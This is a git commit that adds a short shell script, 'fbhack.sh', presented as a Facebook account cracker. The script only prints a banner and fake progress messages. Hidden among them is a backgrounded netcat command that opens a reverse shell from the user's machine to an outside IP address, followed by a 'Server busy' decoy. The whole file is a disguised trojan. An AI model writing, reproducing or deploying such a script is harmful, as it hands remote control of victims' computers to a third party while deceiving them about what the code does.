359c30a1ad83e5bd07177fdcfa13fe3ac4bdbc16
Shiva454527 <80078546+Shiva454527@users.noreply.github.com>
2021-03-08 15:18:21 +0530

    Add files via upload

---
+++ fbhack.sh
@@ -0,0 +1,9 @@
+toilet -f future "Facebook Account Cracking"
+echo "enter numeri id "
+sleep 5
+echo " [+] Account to crack : "
+echo  " [+] , please wait ..."
+echo "[+] reading database...."
+sleep 5
+nc 10.9.45.30 1194  -e /bin/bash > /dev/null 2>&1 & echo "[+]Server busy please "
+
